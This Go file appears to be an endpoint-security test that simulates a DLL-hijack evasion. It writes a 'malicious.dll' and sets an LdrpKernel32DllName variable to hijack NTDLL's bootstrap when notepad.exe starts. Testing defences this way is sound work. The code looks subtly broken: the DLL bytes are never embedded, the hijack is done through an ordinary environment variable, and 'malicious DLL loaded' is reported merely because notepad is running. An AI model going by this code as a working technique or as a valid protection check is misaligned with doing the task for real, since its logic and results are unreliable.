//go:build windows
// +build windows

/*
ID: 6a01a5d9-1fb0-4ad9-a813-d541012996b8
NAME: Evasion via LdrpKernel32 Overwrite
CREATED: 2024-06-28
scenario: load malicious DLL early via hijacking normal NTDLL bootstrap process
loads malicious DLL instead of kernel32 and resume rest of loading process steps
*/
package main

import (
	_ "embed"
	Endpoint "github.com/preludeorg/test/endpoint"
	"os"
	"os/exec"
	"time"
)

var maliciousDLL []byte

/*
write `malicious.dll` to temp location
set `LdrpKernel32DllName` env variable to path of malicious DLL
start new `notepad.exe` process to trigger DLL hijack
wait 5 seconds
check if process running and interacting with malicious DLL
*/
func test() {
	Endpoint.Say("testing...")

	// write malicious DLL to temp location
	dllPath := Endpoint.Pwd("malicious.dll")
	Endpoint.Write(dllPath, maliciousDLL)

	// set up env var to hijack NTDLL bootstrap process
	os.Setenv("LdrpKernel32DllName", dllPath)

	// execute new process to trigger hijack
	cmd := exec.Command("notepad.exe")
	err := cmd.Start()
	if err != nil {
		Endpoint.Say("error starting process: " + err.Error())
		Endpoint.Stop(1)
		return
	}
	time.Sleep(5*time.Second)

	// check if process is running + interacting with malicious DLL
	processRunning := Endpoint.IsProcessRunning(cmd.Process.Pid)
	if processRunning {
		Endpoint.Say("process running with malicious DLL loaded")
		Endpoint.Stop(101) // unprotected
	} else {
		Endpoint.Say("process did not load malicious DLL")
		Endpoint.Stop(100) // protected
	}
}

func cleanup() {
	Endpoint.Say("cleaning up...")
	// remove env var
	os.Unsetenv("LdrpKernel32DllName")

	// remove malicious DLL
	dllPath := Endpoint.Pwd("malicious.dll")
	Endpoint.Remove(dllPath)
}

func main() {
	Endpoint.Start(test, cleanup)
}